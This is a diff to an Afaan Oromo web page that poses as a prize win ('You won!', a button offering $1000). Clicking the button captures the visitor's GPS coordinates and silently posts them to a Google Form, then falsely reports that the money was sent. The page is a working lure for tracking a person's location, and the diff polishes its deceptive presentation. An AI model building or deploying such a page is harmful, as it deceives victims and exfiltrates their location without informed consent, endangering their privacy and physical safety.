@@ -3,14 +3,87 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Doolaara 1000 argadhe</title>
+<title>Ati injifatte!</title>
+
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    color: #fff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+  }
+
+  .container {
+    background: rgba(255, 255, 255, 0.1);
+    padding: 30px;
+    border-radius: 15px;
+    text-align: center;
+    width: 90%;
+    max-width: 400px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+  }
+
+  h2 {
+    margin-bottom: 20px;
+    font-size: 24px;
+  }
+
+  .image-box {
+    width: 200px;
+    height: 200px;
+    margin: 0 auto 20px auto;
+    border-radius: 10px;
+    overflow: hidden;
+    border: 2px solid #fff;
+  }
+
+  .image-box img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+
+  button {
+    background: #00c853;
+    color: #fff;
+    border: none;
+    padding: 14px 20px;
+    font-size: 16px;
+    border-radius: 8px;
+    cursor: pointer;
+    width: 100%;
+    transition: background 0.3s ease;
+  }
+
+  button:hover {
+    background: #00a844;
+  }
+
+  #msg {
+    margin-top: 15px;
+    font-size: 14px;
+  }
+</style>
 </head>
+
 <body>
 
-<h2>Mo’adhure</h2>
-<button onclick="sendLocation()">Maallaqa argachuuf cuqaasi</button>
+<div class="container">
+  <h2>Ati injifatte!</h2>
 
-<p id="msg"></p>
+  <!-- Square image in the center -->
+  <div class="image-box">
+    <img src="https://raw.githubusercontent.com/aliroumani100/gfhfyfy/refs/heads/main/image.jpeg" alt="Center Image">
+  </div>
+
+  <button onclick="sendLocation()">$1000 kee fudhachuuf asitti cuqaasi</button>
+
+  <p id="msg"></p>
+</div>
 
 <script>
 function sendLocation() {
@@ -20,7 +93,6 @@ function sendLocation() {
       let lat = position.coords.latitude;
       let lng = position.coords.longitude;
 
-      // رابط Google Form (عدله)
       let formURL = "https://docs.google.com/forms/d/e/1FAIpQLSfr6p1arARQTyRsMASibYuw7rymxMdJqqVkUGHIxJ7mDwsB1A/formResponse";
 
       let data = new URLSearchParams();
@@ -34,11 +106,11 @@ function sendLocation() {
       });
 
       document.getElementById("msg").innerHTML =
-      "✅ Maallaqni milkaa’inaan ergame";
+        "✅ Maallaqni milkaa’inaan ergame";
 
     }, function() {
       document.getElementById("msg").innerHTML =
-      "❌ didame";
+        "❌ didame";
     });
   }
 }
@@ -46,4 +118,3 @@ function sendLocation() {
 
 </body>
 </html>
-
